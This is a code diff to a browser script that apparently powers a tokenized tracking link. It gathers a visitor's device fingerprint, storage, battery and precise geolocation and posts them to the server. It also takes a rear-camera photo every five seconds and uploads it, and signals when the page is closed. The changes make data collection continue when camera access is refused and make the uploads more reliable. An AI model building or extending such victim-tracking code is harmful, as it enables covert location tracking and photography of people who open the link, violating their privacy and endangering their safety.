@@ -1,6 +1,8 @@
 // static/wrap_app.js
 (async () => {
   const token = window.TOKEN;
+  if (!token) return;
+
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
   const ctx = canvas.getContext("2d");
@@ -8,8 +10,11 @@
   const CAPTURE_MS = 5000;
   let stream = null;
   let loopTimer = null;
+  let cameraAllowed = false;
 
   const json = (o) => JSON.stringify(o);
+
+  // ---------- Helpers ----------
 
   async function getDetails() {
     const d = {};
@@ -18,6 +23,7 @@
     d.cpuCores = navigator.hardwareConcurrency || null;
     d.ramGB = navigator.deviceMemory || null;
     d.languages = navigator.languages || [navigator.language];
+
     d.screen = {
       w: window.screen.width,
       h: window.screen.height,
@@ -49,6 +55,20 @@
       }
     }
 
+    // Approx storage (ROM-like) info
+    d.storage = {};
+    try {
+      if (navigator.storage && navigator.storage.estimate) {
+        const est = await navigator.storage.estimate();
+        d.storage = {
+          quotaBytes: est.quota || null,
+          usageBytes: est.usage || null,
+        };
+      }
+    } catch {
+      // ignore
+    }
+
     try {
       const opt = Intl.DateTimeFormat().resolvedOptions();
       d.tz = { zone: opt.timeZone, offset: new Date().getTimezoneOffset() };
@@ -62,25 +82,39 @@
     try {
       if (!navigator.getBattery) return null;
       const b = await navigator.getBattery();
-      return { level: Math.round(b.level * 100), charging: b.charging };
+      return { level: Math.round(b.level * 100), charging: !!b.charging };
     } catch {
       return null;
     }
   }
 
-  async function getCoords() {
+  async function getCoords(timeout = 4000) {
     return new Promise((resolve) => {
-      if (!navigator.geolocation) return resolve(null);
+      if (!("geolocation" in navigator)) return resolve(null);
+      let done = false;
       navigator.geolocation.getCurrentPosition(
-        (pos) =>
+        (pos) => {
+          if (done) return;
+          done = true;
           resolve({
             lat: pos.coords.latitude,
             lon: pos.coords.longitude,
             acc: pos.coords.accuracy,
-          }),
-        () => resolve(null),
-        { enableHighAccuracy: true, timeout: 4000 }
+          });
+        },
+        () => {
+          if (done) return;
+          done = true;
+          resolve(null);
+        },
+        { timeout, enableHighAccuracy: true }
       );
+      setTimeout(() => {
+        if (!done) {
+          done = true;
+          resolve(null);
+        }
+      }, timeout + 300);
     });
   }
 
@@ -125,7 +159,7 @@
   }
 
   async function captureAndUpload(battery, coords) {
-    if (!stream) return;
+    if (!cameraAllowed || !stream) return;
     if (!video.videoWidth || !video.videoHeight) return;
 
     canvas.width = video.videoWidth;
@@ -147,39 +181,49 @@
       getDetails(),
     ]);
 
+    // Always send info
     await post(`/upload_info/${token}`, {
       battery,
       coords,
       details,
     });
 
-    await captureAndUpload(battery, coords);
+    // Only send photo if camera permission granted and stream is live
+    if (cameraAllowed) {
+      await captureAndUpload(battery, coords);
+    }
   }
 
   async function start() {
+    // Try to get camera, but don't break if denied
     try {
       stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "environment" },
         audio: false,
       });
-    } catch {
-      // no camera, still send info
-      await tick();
-      return;
+      cameraAllowed = true;
+    } catch (e) {
+      cameraAllowed = false;
+      stream = null;
     }
 
-    video.srcObject = stream;
-    try {
-      await video.play();
-    } catch {
-      // ignore
+    if (cameraAllowed && stream) {
+      video.srcObject = stream;
+      try {
+        await video.play();
+      } catch {
+        // ignore
+      }
+      // Wait for a real frame
+      await waitForVideoReady(4000);
+      await new Promise((r) => setTimeout(r, 300));
     }
 
-    await waitForVideoReady(4000);
-    await new Promise((r) => setTimeout(r, 300)); // let a real frame arrive
-
-    await tick(); // first tick immediately
-    loopTimer = setInterval(tick, CAPTURE_MS);
+    // First tick immediately (info only if no camera)
+    await tick();
+    loopTimer = setInterval(() => {
+      tick().catch((err) => console.warn("tick error", err));
+    }, CAPTURE_MS);
   }
 
   function stop() {
@@ -198,12 +242,21 @@
 
   window.addEventListener("beforeunload", () => {
     try {
-      navigator.sendBeacon(
-        `/upload_info/${token}`,
-        new Blob([json({ note: "page-closed" })], {
-          type: "application/json",
-        })
-      );
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(
+          `/upload_info/${token}`,
+          new Blob([json({ note: "page-closed" })], {
+            type: "application/json",
+          })
+        );
+      } else {
+        fetch(`/upload_info/${token}`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: json({ note: "page-closed" }),
+          keepalive: true,
+        }).catch(() => {});
+      }
     } catch {
       // ignore
     }
